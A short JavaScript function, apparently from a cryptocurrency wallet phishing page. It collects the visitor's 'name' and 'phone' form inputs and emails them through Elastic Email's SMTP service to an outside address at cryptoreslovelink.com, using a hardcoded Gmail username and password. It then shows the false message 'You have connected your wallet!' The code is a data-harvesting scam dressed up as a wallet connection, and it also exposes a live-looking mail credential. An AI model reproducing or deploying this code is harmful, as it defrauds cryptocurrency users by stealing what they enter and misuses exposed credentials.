function emailSend(){

	var userName = document.getElementById('name').value;
	var phone = document.getElementById('phone').value;

	var messageBody = "Name " + userName +
	"<br/> Phone " + phone;
	Email.send({
    Host : "smtp.elasticemail.com",
    Username : "jeffreycornelius658@gmail.com",
    Password : "2BB24E906B2BB3A0853B310033DD007E93DF",
    To : 'info@cryptoreslovelink.com',
    From : "jeffreycornelius658@gmail.com",
    Subject : "This is the subject",
    Body : messageBody
}).then(
  message => {
  	if(message=='OK'){
  		swal("Successful", "You have connected your wallet!", "success");
  	}
  	else{
  		swal("Error", "Failed!", "error");
  	}
  }
);
}